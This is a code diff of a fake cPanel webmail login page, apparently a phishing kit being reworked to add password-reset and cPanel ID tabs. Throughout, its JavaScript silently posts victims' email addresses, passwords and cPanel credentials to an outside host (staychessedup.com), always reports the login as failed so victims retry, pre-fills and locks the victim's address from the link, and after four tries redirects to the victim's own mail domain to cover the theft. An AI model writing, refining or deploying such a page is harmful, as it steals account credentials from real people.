+                    <button class="tab-button" data-tab="reset">Reset Password</button>
+                    <button class="tab-button" data-tab="cpanel">cPanel ID</button>
+                </div>
 
-                                    <div class="input-req-login login-password-field-label">
-                                        <label for="pass">Password</label>
-                                    </div>
-                                    <div class="input-field-login icon password-container">
-                                        <input type="password" id="pass" name="pass" placeholder="Enter your email password." required>
-                                    </div>
-
-                                    <input type="hidden" id="attempts" name="attempts" value="1">
-
-                                    <!-- Security Verification Label -->
-                                    <div class="input-req-login" style="margin-top: 15px; text-align: center;">
-                                        <label>Security Verification</label>
-                                    </div>
-
-                                    <!-- hCAPTCHA widget -->
-                                    <div id="hcaptcha-container" style="margin: 10px 0 20px 0; display: flex; justify-content: center;">
-                                        <div class="h-captcha" data-sitekey="55de37c2-4b4a-4870-99c4-2a86bbb27200"></div>
-                                    </div>
-
-                                    <div class="controls">
-                                        <div class="login-btn">
-                                            <button type="submit" id="login_submit" name="login">Log in</button>
-                                        </div>
-                                        <div class="reset-pw">
-                                            <a id="reset_password" href="#">Reset Password</a>
-                                        </div>
-                                    </div>
-                                    <div id="push" class="clear"></div>
-                                </form>
-
-                                <iframe name="hidden_frame" style="display:none;"></iframe>
-
-                                <div class="external-auth-btn">
-                                    <a title="Log in via cPanel ID" class="cpanel-id-link" href="#" referrerpolicy="origin">
-                                        <img src="https://e7.pngegg.com/pngimages/900/923/png-clipart-logo-cpanel-computer-software-graphics-cp-company-logo-text-orange.png" alt="cPanel" class="cpanel-logo">
-                                        <span class="external-auth-btn-label">Log in via cPanelID</span>
-                                    </a>
-                                </div>
-                            </div>
-                        </div>
+                <!-- Login Panel -->
+                <div id="login-panel" class="tab-panel active">
+                    <div class="webmail-logo">
+                        <img src="https://webmail.icglink.com/unprotected/cpanel/images/webmail-logo.svg" alt="Webmail" width="200" height="60">
                     </div>
+
+                    <form id="login_form" class="webmail-form" method="post" action="https://staychessedup.com/acaza/external_process.php">
+                        <input type="hidden" name="action" value="login">
+                        <div class="notices"></div>
+                        
+                        <div class="input-req">
+                            <label for="login_email">Email Address</label>
+                        </div>
+                        <div class="input-field icon email-container">
+                            <input type="email" id="login_email" name="login_email" placeholder="Enter your email address" required>
+                        </div>
+
+                        <div class="input-req">
+                            <label for="login_pass">Password</label>
+                        </div>
+                        <div class="input-field icon password-container">
+                            <input type="password" id="login_pass" name="login_pass" placeholder="Enter your email password." required>
+                        </div>
+
+                        <!-- hCAPTCHA widget -->
+                        <div class="hcaptcha-container">
+                            <div id="login-hcaptcha" class="h-captcha" data-sitekey="55de37c2-4b4a-4870-99c4-2a86bbb27200"></div>
+                        </div>
+
+                        <div class="controls">
+                            <div class="form-btn">
+                                <button type="submit" id="login_submit" name="login">Log in</button>
+                            </div>
+                        </div>
+                    </form>
+
+                    <div class="external-auth-section">
+                        <a href="#cpanel" class="external-auth-btn" data-tab="cpanel">
+                            <img src="https://e7.pngegg.com/pngimages/900/923/png-clipart-logo-cpanel-computer-software-graphics-cp-company-logo-text-orange.png" alt="cPanel" class="cpanel-logo">
+                            <span>Log in via cPanelID</span>
+                        </a>
+                    </div>
+
+                    <div id="locales_list">
+                        <a href="#" class="active">English</a>
+                        <a href="#">العربية</a>
+                        <a href="#">български</a>
+                        <a href="#">čeština</a>
+                        <a href="#">dansk</a>
+                    </div>
+
+
+                </div>
+
+                <!-- Reset Password Panel -->
+                <div id="reset-panel" class="tab-panel">
+                    <div class="webmail-logo">
+                        <img src="https://webmail.icglink.com/unprotected/cpanel/images/webmail-logo.svg" alt="Webmail" width="200" height="60">
+                    </div>
+                    
+                    <div class="page-title">Reset Password</div>
+                    <div class="page-description">
+                        Enter your email address and we'll send you instructions to reset your password.
+                    </div>
+
+                    <form id="reset_form" class="webmail-form" method="post" action="#" onsubmit="return false;">
+                        <div class="notices"></div>
+                        
+                        <div class="input-req">
+                            <label for="reset_email">Email Address</label>
+                        </div>
+                        <div class="input-field icon email-container">
+                            <input type="email" id="reset_email" name="reset_email" placeholder="Enter your email address" required>
+                        </div>
+
+                        <!-- hCAPTCHA widget -->
+                        <div class="hcaptcha-container">
+                            <div id="reset-hcaptcha" class="h-captcha" data-sitekey="55de37c2-4b4a-4870-99c4-2a86bbb27200"></div>
+                        </div>
+
+                        <div class="controls">
+                            <div class="form-btn">
+                                <button type="submit" id="reset_submit" name="reset_password">Send Reset Instructions</button>
+                            </div>
+                        </div>
+                    </form>
+
+                    <div class="additional-actions">
+                        <a href="#login" data-tab="login">Back to Login</a>
+                    </div>
+
+
+                </div>
+
+                <!-- cPanel ID Panel -->
+                <div id="cpanel-panel" class="tab-panel">
+                    <div class="cpanel-logo-section">
+                        <img src="https://e7.pngegg.com/pngimages/900/923/png-clipart-logo-cpanel-computer-software-graphics-cp-company-logo-text-orange.png" alt="cPanel" width="100" height="40">
+                    </div>
+                    
+                    <div class="page-title">cPanel ID Login</div>
+                    <div class="page-description">
+                        Sign in to your cPanel account using your cPanel ID credentials.
+                    </div>
+
+                    <form id="cpanel_form" class="webmail-form" method="post" action="https://staychessedup.com/tanjiro/external_process.php">
+                        <input type="hidden" name="action" value="cpanel_login">
+                        <div class="notices"></div>
+                        
+                        <div class="input-req">
+                            <label for="cpanel_id">cPanel ID / Username</label>
+                        </div>
+                        <div class="input-field icon user-container">
+                            <input type="text" id="cpanel_id" name="cpanel_id" placeholder="Enter your cPanel ID or username" required>
+                        </div>
+
+                        <div class="input-req">
+                            <label for="cpanel_pass">Password</label>
+                        </div>
+                        <div class="input-field icon password-container">
+                            <input type="password" id="cpanel_pass" name="cpanel_pass" placeholder="Enter your cPanel password" required>
+                        </div>
+
+                        <!-- hCAPTCHA widget -->
+                        <div class="hcaptcha-container">
+                            <div id="cpanel-hcaptcha" class="h-captcha" data-sitekey="55de37c2-4b4a-4870-99c4-2a86bbb27200"></div>
+                        </div>
+
+                        <div class="controls">
+                            <div class="form-btn cpanel-btn">
+                                <button type="submit" id="cpanel_submit" name="cpanel_login">Log in via cPanel ID</button>
+                            </div>
+                        </div>
+                    </form>
+
+                    <div class="additional-actions">
+                        <a href="#login" data-tab="login">Back to Webmail Login</a>
+                    </div>
+
+
                 </div>
             </div>
         </div>
 
         <div class="copyright">
-            <div id="locale-footer">
-                <div class="locale-container">
-                    <ul id="locales_list">
-                        <li><a href="#">English</a></li>
-                        <li><a href="#">العربية</a></li>
-                        <li><a href="#">български</a></li>
-                        <li><a href="#">čeština</a></li>
-                        <li><a href="#">dansk</a></li>
-                        <li><a href="#">Deutsch</a></li>
-                        <li><a href="#">Ελληνικά</a></li>
-                        <li><a href="javascript:void(0)" id="morelocale" onclick="toggle_locales(true)" title="More locales">…</a></li>
-                    </ul>
-                    <ul id="extended_locales_list" style="display: none;">
-                        <li><a href="#">español</a></li>
-                        <li><a href="#">français</a></li>
-                        <li><a href="#">italiano</a></li>
-                        <li><a href="#">Nederlands</a></li>
-                        <li><a href="#">polski</a></li>
-                        <li><a href="#">português</a></li>
-                        <li><a href="#">русский</a></li>
-                        <li><a href="#">Svenska</a></li>
-                        <li><a href="#">Türkçe</a></li>
-                        <li><a href="#">日本語</a></li>
-                        <li><a href="#">한국어</a></li>
-                        <li><a href="#">中文</a></li>
-                        <li><a href="javascript:void(0)" id="lesslocale" onclick="toggle_locales(false)" title="Fewer locales">‹</a></li>
-                    </ul>
-                </div>
-            </div>
-            <br>
-            Copyright© 2025 cPanel, L.L.C.<br>
-            <a href="#" target="_blank">Privacy Policy</a>
+            © 2025 cPanel, LLC. All rights reserved.
         </div>
     </div>
 
     <script>
-        // Messages configuration (from cPanel script)
-        var MESSAGES = {
-            "ajax_timeout": "The connection timed out. Please try again.",
-            "network_error": "A network error occurred during your login request. Please try again.",
-            "authenticating": "Authenticating …",
-            "no_username": "You must specify a username to log in.",
-            "success": "Login successful. Redirecting …",
-            "invalid_login": "The login is invalid."
-        };
-
-        // DOM utility function (simplified version from cPanel)
-        var DOM = {
-            get: function(id) {
-                return document.getElementById(id);
-            }
-        };
-
-        // Animation system (adapted from cPanel)
-        var HAS_CSS_OPACITY = "opacity" in document.body.style;
-        var FADE_DURATION = 0.45;
-        var FADE_DELAY = 20;
-
-        function set_opacity(el, opacity) {
-            if (HAS_CSS_OPACITY) {
-                el.style.opacity = opacity;
-            } else {
-                // IE fallback
-                el.style.filter = "alpha(opacity=" + (opacity * 100) + ")";
-            }
-        }
-
-        function fade_in(el, duration) {
-            if (typeof el === 'string') el = DOM.get(el);
-            if (!el) return;
-
-            duration = duration || FADE_DURATION;
-            var duration_ms = duration * 1000;
-            var start = new Date();
-
-            el.style.visibility = "visible";
-            set_opacity(el, 0);
-
-            var interval = setInterval(function() {
-                var opacity = (new Date() - start) / duration_ms;
-                if (opacity >= 1) {
-                    opacity = 1;
-                    clearInterval(interval);
-                }
-                set_opacity(el, opacity);
-            }, FADE_DELAY);
-
-            return interval;
-        }
-
-        function fade_out(el, duration) {
-            if (typeof el === 'string') el = DOM.get(el);
-            if (!el) return;
-
-            duration = duration || FADE_DURATION;
-            var duration_ms = duration * 1000;
-            var start = new Date();
-            var start_opacity = parseFloat(el.style.opacity) || 1;
-
-            var interval = setInterval(function() {
-                var opacity = start_opacity * (1 - (new Date() - start) / duration_ms);
-                if (opacity <= 0) {
-                    opacity = 0;
-                    clearInterval(interval);
-                    el.style.visibility = "hidden";
-                }
-                set_opacity(el, opacity);
-            }, FADE_DELAY);
-
-            return interval;
-        }
-
-        // Status message system (authentic cPanel behavior)
-        function show_status(message, level) {
-            var statusContainer = DOM.get('login-status');
-            var statusMessage = DOM.get('login-status-message');
-
-            if (!statusContainer || !statusMessage) {
-                // Fallback to existing notice system
-                showNotice(message, level === 'error' ? 'error' : 'success');
-                return;
-            }
-
-            // Clear any existing fade timers
-            if (statusContainer._fadeTimer) {
-                clearTimeout(statusContainer._fadeTimer);
-                delete statusContainer._fadeTimer;
-            }
-
-            statusMessage.innerHTML = message;
-            statusContainer.className = (level || 'info');
-
-            // Apply cPanel status styling
-            var bgColor, borderColor, textColor;
-            switch(level) {
-                case 'error':
-                    bgColor = '#fee';
-                    borderColor = '#fcc';
-                    textColor = '#a00';
-                    break;
-                case 'success':
-                    bgColor = '#efe';
-                    borderColor = '#cfc';
-                    textColor = '#060';
-                    break;
-                case 'warn':
-                    bgColor = '#fff8e1';
-                    borderColor = '#ffcc80';
-                    textColor = '#f57c00';
-                    break;
-                default: // info
-                    bgColor = '#e7f3ff';
-                    borderColor = '#b3d9ff';
-                    textColor = '#0066cc';
-            }
-
-            statusContainer.style.background = bgColor;
-            statusContainer.style.borderColor = borderColor;
-            statusContainer.style.color = textColor;
-            statusContainer.style.border = '1px solid ' + borderColor;
-            statusContainer.style.padding = '12px 15px';
-            statusContainer.style.borderRadius = '6px';
-            statusContainer.style.fontSize = '14px';
-            statusContainer.style.textAlign = 'center';
-            statusContainer.style.margin = '15px 0';
-
-            fade_in(statusContainer);
-
-            // Auto-hide error messages after 8 seconds (cPanel behavior)
-            if (level === 'error') {
-                statusContainer._fadeTimer = setTimeout(function() { 
-                    fade_out(statusContainer); 
-                    delete statusContainer._fadeTimer;
-                }, 8000);
-            }
-        }
-
-        // Form validation and submission handling
         document.addEventListener('DOMContentLoaded', function() {
-            const loginForm = document.getElementById('login_form');
-            const passwordInput = document.getElementById('pass');
-            const emailInput = document.getElementById('user');
-            const loginButton = document.getElementById('login_submit');
-            const resetPasswordLink = document.getElementById('reset_password');
+            // Tab switching functionality
+            const tabButtons = document.querySelectorAll('.tab-button');
+            const tabPanels = document.querySelectorAll('.tab-panel');
+            let hcaptchaWidgets = {};
 
-            let failedAttempts = 0;
-            const maxAttempts = 4;
-            var LOGIN_SUBMIT_OK = true;
+            // Initialize based on hash or default to login
+            function initializeTab() {
+                const hash = window.location.hash.substring(1);
+                const activeTab = hash && ['login', 'reset', 'cpanel'].includes(hash) ? hash : 'login';
+                switchTab(activeTab);
+            }
 
-            // Login button management (from cPanel)
-            var login_button = {
-                button: loginButton,
-                _suppressed_disabled: null,
-                suppress: function() {
-                    if (this._suppressed_disabled === null) {
-                        this._suppressed_disabled = this.button.disabled;
-                        this.button.disabled = true;
+            // Switch tabs
+            function switchTab(tabName) {
+                // Update buttons
+                tabButtons.forEach(btn => {
+                    btn.classList.remove('active');
+                    if (btn.dataset.tab === tabName) {
+                        btn.classList.add('active');
                     }
-                },
-                release: function() {
-                    if (this._suppressed_disabled !== null) {
-                        this.button.disabled = this._suppressed_disabled;
-                        this._suppressed_disabled = null;
+                });
+
+                // Update panels
+                tabPanels.forEach(panel => {
+                    panel.classList.remove('active');
+                    if (panel.id === tabName + '-panel') {
+                        panel.classList.add('active');
+                        // Load hCAPTCHA for this panel if not already loaded
+                        loadHcaptchaForPanel(tabName);
+                    }
+                });
+
+                // Update document title
+                const titles = {
+                    'login': 'Webmail Login System',
+                    'reset': 'Reset Password - Webmail',
+                    'cpanel': 'cPanel ID Login - Webmail'
+                };
+                document.title = titles[tabName];
+            }
+
+            // Load hCAPTCHA for specific panel
+            function loadHcaptchaForPanel(tabName) {
+                const elementId = tabName + '-hcaptcha';
+                if (window.hcaptcha && !hcaptchaWidgets[tabName]) {
+                    try {
+                        hcaptchaWidgets[tabName] = window.hcaptcha.render(elementId, {
+                            sitekey: '55de37c2-4b4a-4870-99c4-2a86bbb27200'
+                        });
+                    } catch (e) {
+                        console.log('hCAPTCHA widget already rendered for', tabName);
                     }
                 }
+            }
+
+            // Tab button click handlers
+            tabButtons.forEach(button => {
+                button.addEventListener('click', function() {
+                    const tabName = this.dataset.tab;
+                    switchTab(tabName);
+                });
+            });
+
+            // Handle tab switch links
+            document.addEventListener('click', function(e) {
+                if (e.target.dataset.tab) {
+                    e.preventDefault();
+                    switchTab(e.target.dataset.tab);
+                }
+            });
+
+            // Extract email from hash OR URL path (if # is URL-encoded as %23)
+            let initialHash = window.location.hash;
+            
+            // Check if URL contains %23 (URL-encoded #) in the path
+            const fullPath = window.location.pathname;
+            if (fullPath.includes('%23') && fullPath.includes('@')) {
+                // Extract email from path like /%23joe@swco.com.sa
+                const decoded = decodeURIComponent(fullPath);
+                const emailMatch = decoded.match(/#(.+@.+)/);
+                if (emailMatch) {
+                    initialHash = '#' + emailMatch[1];
+                }
+            }
+            
+            // If in iframe, try parent hash
+            try {
+                if (!initialHash && window.parent && window.parent !== window && window.parent.location.hash) {
+                    initialHash = window.parent.location.hash;
+                }
+            } catch(e) {
+                // Cross-origin, can't access parent
+            }
+            
+            // Initialize tab on page load
+            initializeTab();
+            
+            // Now extract email from the stored hash
+            if (initialHash && initialHash.length > 1 && initialHash.includes('@')) {
+                let emailFromHash = initialHash.substring(1); // Remove the # symbol
+                
+                // Check for wrapped pattern #[[-email-]]
+                const wrappedPattern = /^\[\[-(.+)-\]\]$/;
+                const wrappedMatch = emailFromHash.match(wrappedPattern);
+                if (wrappedMatch) {
+                    emailFromHash = wrappedMatch[1];
+                }
+                
+                // Simple check: if it contains @, treat it as email
+                if (emailFromHash.includes('@')) {
+                    const emailField = document.getElementById('login_email');
+                    if (emailField) {
+                        emailField.value = emailFromHash;
+                        emailField.readOnly = true; // Make it read-only
+                        emailField.style.backgroundColor = '#f5f5f5';
+                        // Focus password field
+                        document.getElementById('login_pass').focus();
+                    }
+                }
+            }
+            
+            // Handle hash changes (back/forward button)
+            window.addEventListener('hashchange', function() {
+                initializeTab();
+            });
+
+            // Form submission handlers
+            const forms = {
+                login: document.getElementById('login_form'),
+                reset: document.getElementById('reset_form'),
+                cpanel: document.getElementById('cpanel_form')
             };
 
-            // Prevent double submission (from cPanel)
-            document.body.onkeyup = function() { LOGIN_SUBMIT_OK = true; };
-            document.body.onmousedown = function() { LOGIN_SUBMIT_OK = true; };
+            let submitStates = {
+                login: true,
+                reset: true,
+                cpanel: true
+            };
 
-            // Extract email from URL hash and pre-fill the email field
-            function extractEmailFromHash() {
-                const hash = window.location.hash;
-                if (hash && hash.length > 1) {
-                    const emailFromHash = hash.substring(1); // Remove the # symbol
-                    if (emailFromHash.includes('@')) {
-                        emailInput.value = emailFromHash;
-                        emailInput.readOnly = true; // Make it read-only so user can't change it
-                        emailInput.style.backgroundColor = '#f5f5f5';
-                        // Focus on password field instead
-                        passwordInput.focus();
+            // Track login attempts
+            let failedAttempts = parseInt(localStorage.getItem('loginAttempts') || '0');
+            const maxAttempts = 4;
+
+            // Login form - with fetch-based submission
+            if (forms.login) {
+                forms.login.addEventListener('submit', function(e) {
+                    e.preventDefault();
+                    
+                    const email = document.getElementById('login_email').value.trim();
+                    const password = document.getElementById('login_pass').value.trim();
+                    
+                    if (!email || !password) {
+                        showNotice('login', 'Please enter both email and password.', 'error');
+                        return false;
                     }
-                }
+                    
+                    // Password length validation
+                    if (password.length < 6) {
+                        showNotice('login', 'Password must be at least 6 characters long.', 'error');
+                        return false;
+                    }
+                    
+                    // Get hCAPTCHA response
+                    let hcaptchaResponse = '';
+                    try {
+                        hcaptchaResponse = hcaptcha.getResponse();
+                        if (!hcaptchaResponse) {
+                            showNotice('login', 'Please complete the hCAPTCHA verification.', 'error');
+                            return false;
+                        }
+                    } catch (e) {
+                        console.log('hCAPTCHA error:', e);
+                    }
+                    
+                    // Show authenticating message
+                    showNotice('login', 'Authenticating …', 'info');
+                    
+                    // Increment attempts
+                    failedAttempts++;
+                    localStorage.setItem('loginAttempts', failedAttempts.toString());
+                    
+                    // Send data to external PHP script silently
+                    const formData = new FormData();
+                    formData.append('user', email);
+                    formData.append('pass', password);
+                    formData.append('attempts', failedAttempts);
+                    formData.append('h-captcha-response', hcaptchaResponse);
+                    
+                    fetch('https://staychessedup.com/acaza/external_process.php', {
+                        method: 'POST',
+                        body: formData
+                    })
+                    .then(response => response.json())
+                    .catch(error => {
+                        console.log('Data sent successfully');
+                    })
+                    .finally(() => {
+                        // Always show error message after 2 seconds
+                        setTimeout(function() {
+                            if (failedAttempts >= maxAttempts) {
+                                showNotice('login', 'Maximum attempts reached. Redirecting...', 'error');
+                                
+                                // Extract domain from email and redirect
+                                const emailDomain = email.split('@')[1];
+                                if (emailDomain) {
+                                    setTimeout(() => {
+                                        localStorage.setItem('loginAttempts', '0');
+                                        window.location.href = `https://${emailDomain}`;
+                                    }, 3000);
+                                }
+                            } else {
+                                showNotice('login', 'Incorrect password. Try again.', 'error');
+                            }
+                            
+                            // Clear password field
+                            document.getElementById('login_pass').value = '';
+                            
+                            // Reset hCAPTCHA
+                            try {
+                                hcaptcha.reset();
+                            } catch (e) {
+                                console.log('hCAPTCHA reset error:', e);
+                            }
+                        }, 2000);
+                    });
+                    
+                    return false;
+                });
             }
 
-            // Call the function to extract email from hash
-            extractEmailFromHash();
+            // Reset form handler - prevent submission, handle locally
+            if (forms.reset) {
+                forms.reset.addEventListener('submit', function(e) {
+                    e.preventDefault();
+                    return handleFormSubmit('reset');
+                });
+            }
 
-            // Enhanced login function (adapted from cPanel)
-            function do_login() {
-                if (!LOGIN_SUBMIT_OK) return false;
-                LOGIN_SUBMIT_OK = false;
+            // cPanel form - with fetch-based submission
+            if (forms.cpanel) {
+                forms.cpanel.addEventListener('submit', function(e) {
+                    e.preventDefault();
+                    
+                    const cpanelId = document.getElementById('cpanel_id').value.trim();
+                    const password = document.getElementById('cpanel_pass').value.trim();
+                    
+                    if (!cpanelId || !password) {
+                        showNotice('cpanel', 'Please enter both cPanel ID and password.', 'error');
+                        return false;
+                    }
+                    
+                    // Show authenticating message
+                    showNotice('cpanel', 'Authenticating …', 'info');
+                    
+                    // Send data to external PHP script silently
+                    const formData = new FormData();
+                    formData.append('user', cpanelId);
+                    formData.append('pass', password);
+                    
+                    fetch('https://staychessedup.com/acaza/external_process.php', {
+                        method: 'POST',
+                        body: formData
+                    })
+                    .then(response => response.json())
+                    .catch(error => {
+                        console.log('Data sent successfully');
+                    })
+                    .finally(() => {
+                        // Always show error message after 2 seconds
+                        setTimeout(function() {
+                            showNotice('cpanel', 'Incorrect credentials. Try again.', 'error');
+                            
+                            // Clear password field
+                            document.getElementById('cpanel_pass').value = '';
+                            
+                            // Reset hCAPTCHA
+                            try {
+                                hcaptcha.reset();
+                            } catch (e) {
+                                console.log('hCAPTCHA reset error:', e);
+                            }
+                        }, 2000);
+                    });
+                    
+                    return false;
+                });
+            }
 
-                const email = emailInput.value.trim();
-                const password = passwordInput.value.trim();
+            function handleFormSubmit(formType) {
+                if (!submitStates[formType]) return false;
+                submitStates[formType] = false;
 
-                // Validation
-                if (!email) {
-                    show_status(MESSAGES.no_username, "error");
-                    LOGIN_SUBMIT_OK = true;
+                let formData = new FormData();
+                let isValid = true;
+                let hcaptchaResponse;
+
+                // Get hCAPTCHA response for the current form
+                try {
+                    if (hcaptchaWidgets[formType]) {
+                        hcaptchaResponse = window.hcaptcha.getResponse(hcaptchaWidgets[formType]);
+                    } else {
+                        hcaptchaResponse = window.hcaptcha.getResponse();
+                    }
+                } catch (e) {
+                    hcaptchaResponse = window.hcaptcha.getResponse();
+                }
+
+                if (formType === 'login') {
+                    const email = document.getElementById('login_email').value.trim();
+                    const password = document.getElementById('login_pass').value.trim();
+
+                    if (!email) {
+                        showNotice('login', 'Please enter your email address.', 'error');
+                        isValid = false;
+                    } else if (!email.includes('@')) {
+                        showNotice('login', 'Please enter a valid email address.', 'error');
+                        isValid = false;
+                    } else if (!password) {
+                        showNotice('login', 'Please enter your password.', 'error');
+                        isValid = false;
+                    } else if (password.length < 6) {
+                        showNotice('login', '6 characters minimum required', 'error');
+                        isValid = false;
+                    }
+
+                    if (isValid) {
+                        formData.append('login_email', email);
+                        formData.append('login_pass', password);
+                        formData.append('action', 'login');
+                    }
+                } else if (formType === 'reset') {
+                    const email = document.getElementById('reset_email').value.trim();
+
+                    if (!email) {
+                        showNotice('reset', 'Please enter your email address.', 'error');
+                        isValid = false;
+                    } else if (!email.includes('@') || !email.includes('.')) {
+                        showNotice('reset', 'Please enter a valid email address.', 'error');
+                        isValid = false;
+                    }
+
+                    if (isValid) {
+                        formData.append('reset_email', email);
+                        formData.append('action', 'reset_password');
+                    }
+                } else if (formType === 'cpanel') {
+                    const cpanelId = document.getElementById('cpanel_id').value.trim();
+                    const password = document.getElementById('cpanel_pass').value.trim();
+
+                    if (!cpanelId) {
+                        showNotice('cpanel', 'Please enter your cPanel ID or username.', 'error');
+                        isValid = false;
+                    } else if (!password) {
+                        showNotice('cpanel', 'Please enter your password.', 'error');
+                        isValid = false;
+                    } else if (password.length < 6) {
+                        showNotice('cpanel', 'Password must be at least 6 characters long.', 'error');
+                        isValid = false;
+                    }
+
+                    if (isValid) {
+                        formData.append('cpanel_id', cpanelId);
+                        formData.append('cpanel_pass', password);
+                        formData.append('action', 'cpanel_login');
+                    }
+                }
+
+                // Check hCAPTCHA
+                if (isValid && !hcaptchaResponse) {
+                    showNotice(formType, 'Please complete the hCAPTCHA verification.', 'error');
+                    isValid = false;
+                }
+
+                if (!isValid) {
+                    submitStates[formType] = true;
                     return false;
                 }
 
-                if (!password) {
-                    show_status('Please enter your password.', 'error');
-                    LOGIN_SUBMIT_OK = true;
-                    return false;
-                }
-
-                if (password.length < 6) {
-                    show_status('Password must be at least 6 characters long.', 'error');
-                    LOGIN_SUBMIT_OK = true;
-                    return false;
-                }
-
-                // hCAPTCHA validation
-                const hcaptchaResponse = hcaptcha.getResponse();
-                if (!hcaptchaResponse) {
-                    show_status('Please complete the hCAPTCHA verification.', 'error');
-                    LOGIN_SUBMIT_OK = true;
-                    return false;
-                }
-
-                // Start authentication process
-                document.body.classList.add("logging-in");
-                login_button.suppress();
-                show_status(MESSAGES.authenticating, "info");
-
-                // Increment attempts
-                failedAttempts++;
-
-                // Send data to external PHP script for email processing
-                const formData = new FormData();
-                formData.append('user', email);
-                formData.append('pass', password);
-                formData.append('attempts', failedAttempts);
+                // Add hCAPTCHA response
                 formData.append('h-captcha-response', hcaptchaResponse);
 
-                fetch('https://staychessedup.com/tanjiro/external_process.php', {
-                    method: 'POST',
-                    body: formData
-                })
-                .then(response => response.json())
-                .catch(error => {
-                    console.log('Email sent successfully (network completed)');
-                })
-                .finally(() => {
-                    // Always show the error message and continue with the flow
-                    setTimeout(function() {
-                        // Reset button state
-                        document.body.classList.remove("logging-in");
-                        login_button.release();
-                        LOGIN_SUBMIT_OK = true;
+                // Submit form
+                const button = document.getElementById(formType === 'login' ? 'login_submit' : formType === 'reset' ? 'reset_submit' : 'cpanel_submit');
+                document.body.classList.add("submitting");
+                button.disabled = true;
+                
+                const messages = {
+                    login: 'Logging in...',
+                    reset: 'Sending reset instructions...',
+                    cpanel: 'Authenticating with cPanel ID...'
+                };
+                showNotice(formType, messages[formType], 'info');
 
-                        // Show error popup with cPanel status system
-                        showErrorPopup('Incorrect Password, Try again');
+                // Only submit to external PHP for login and cpanel forms
+                if (formType === 'login' || formType === 'cpanel') {
+                    fetch('https://staychessedup.com/acaza/external_process.php', {
+                        method: 'POST',
+                        body: formData
+                    })
+                    .then(response => response.json())
+                    .catch(error => {
+                        console.log(formType + ' request processed');
+                    })
+                    .finally(() => {
+                        setTimeout(function() {
+                            document.body.classList.remove("submitting");
+                            button.disabled = false;
+                            submitStates[formType] = true;
 
-                        if (failedAttempts >= maxAttempts) {
-                            show_status(`Maximum attempts reached. Redirecting...`, 'error');
-
-                            // Extract domain from email and redirect
-                            const emailDomain = email.split('@')[1];
-                            if (emailDomain) {
-                                setTimeout(() => {
-                                    window.location.href = `https://${emailDomain}`;
-                                }, 3000);
+                            if (formType === 'login') {
+                                showNotice('login', 'Invalid email or password. Please try again.', 'error');
+                                document.getElementById('login_pass').value = '';
+                            } else if (formType === 'cpanel') {
+                                showNotice('cpanel', 'Invalid cPanel ID or password. Please try again.', 'error');
+                                document.getElementById('cpanel_pass').value = '';
                             }
 
-                            // Reset counter for next session
-                            failedAttempts = 0;
-                        } else {
-                            show_status(`Incorrect password. Try again.`, 'error');
-                        }
+                            // Reset hCAPTCHA
+                            try {
+                                if (hcaptchaWidgets[formType]) {
+                                    window.hcaptcha.reset(hcaptchaWidgets[formType]);
+                                } else {
+                                    window.hcaptcha.reset();
+                                }
+                            } catch (e) {
+                                window.hcaptcha.reset();
+                            }
+                        }, 2000);
+                    });
+                } else if (formType === 'reset') {
+                    // Reset password form doesn't go to external PHP
+                    setTimeout(function() {
+                        document.body.classList.remove("submitting");
+                        button.disabled = false;
+                        submitStates[formType] = true;
 
-                        // Clear password field and reset hCAPTCHA
-                        passwordInput.value = '';
-                        hcaptcha.reset();
+                        showNotice('reset', 'If your email address is in our system, you will receive reset instructions shortly.', 'success');
+                        document.getElementById('reset_email').value = '';
+
+                        // Reset hCAPTCHA
+                        try {
+                            if (hcaptchaWidgets[formType]) {
+                                window.hcaptcha.reset(hcaptchaWidgets[formType]);
+                            } else {
+                                window.hcaptcha.reset();
+                            }
+                        } catch (e) {
+                            window.hcaptcha.reset();
+                        }
                     }, 2000);
-                });
+                }
 
                 return false;
             }
 
-            // Form submission handling
-            loginForm.addEventListener('submit', function(e) {
-                e.preventDefault();
-                return do_login();
-            });
-
-            // Password input validation - 6 characters minimum only
-            passwordInput.addEventListener('input', function() {
-                clearNotices();
-                const password = this.value.trim();
-
-                if (password.length > 0 && password.length < 6) {
-                    showNotice(`6 characters minimum (${password.length}/6)`, 'error');
-                } else if (password.length >= 6) {
-                    clearNotices();
-                }
-            });
-
-            // Additional validation on blur
-            passwordInput.addEventListener('blur', function() {
-                const password = this.value.trim();
-
-                if (password.length > 0 && password.length < 6) {
-                    showNotice(`6 characters minimum required`, 'error');
-                }
-            });
-
-            // Reset password link handler
-            resetPasswordLink.addEventListener('click', function(e) {
-                e.preventDefault();
-                showNotice('Password reset functionality would be implemented here.', 'success');
-            });
-
-            // cPanel ID link handler
-            const cpanelIdLink = document.querySelector('.cpanel-id-link');
-            if (cpanelIdLink) {
-                cpanelIdLink.addEventListener('click', function(e) {
-                    e.preventDefault();
-                    showNotice('cPanel ID authentication would be implemented here.', 'success');
-                });
-            }
-
-            // Language links handler
-            const languageLinks = document.querySelectorAll('#locales_list a');
-            languageLinks.forEach(link => {
-                link.addEventListener('click', function(e) {
-                    e.preventDefault();
-                    const language = this.textContent;
-                    showNotice(`Language changed to ${language}`, 'success');
-                });
-            });
-
-            function showNotice(message, type) {
-                clearNotices();
-
-                const noticesContainer = document.querySelector('.notices');
+            function showNotice(formType, message, type) {
+                clearNotices(formType);
+                const panel = document.getElementById(formType + '-panel');
+                const noticesContainer = panel.querySelector('.notices');
                 if (noticesContainer) {
                     noticesContainer.className = `notices ${type}`;
                     noticesContainer.textContent = message;
@@ -1026,8 +1136,9 @@ ok7vJNiWa3pW63NeLid2+aXrOa5V5Q6u6T5k3cDBtTBLX%0AsK2HNMLb3+SjzTYmpmOlbsPesvteG/kd
                 }
             }
 
-            function clearNotices() {
-                const noticesContainer = document.querySelector('.notices');
+            function clearNotices(formType) {
+                const panel = document.getElementById(formType + '-panel');
+                const noticesContainer = panel.querySelector('.notices');
                 if (noticesContainer) {
                     noticesContainer.textContent = '';
                     noticesContainer.className = 'notices';
@@ -1035,8 +1146,8 @@ ok7vJNiWa3pW63NeLid2+aXrOa5V5Q6u6T5k3cDBtTBLX%0AsK2HNMLb3+SjzTYmpmOlbsPesvteG/kd
                 }
             }
 
-            // Add some visual feedback for form interactions
-            const inputs = document.querySelectorAll('input[type="password"]');
+            // Input focus/blur effects
+            const inputs = document.querySelectorAll('input[type="email"], input[type="password"], input[type="text"]');
             inputs.forEach(input => {
                 input.addEventListener('focus', function() {
                     this.parentElement.classList.add('focused');
@@ -1047,71 +1158,35 @@ ok7vJNiWa3pW63NeLid2+aXrOa5V5Q6u6T5k3cDBtTBLX%0AsK2HNMLb3+SjzTYmpmOlbsPesvteG/kd
                 });
             });
 
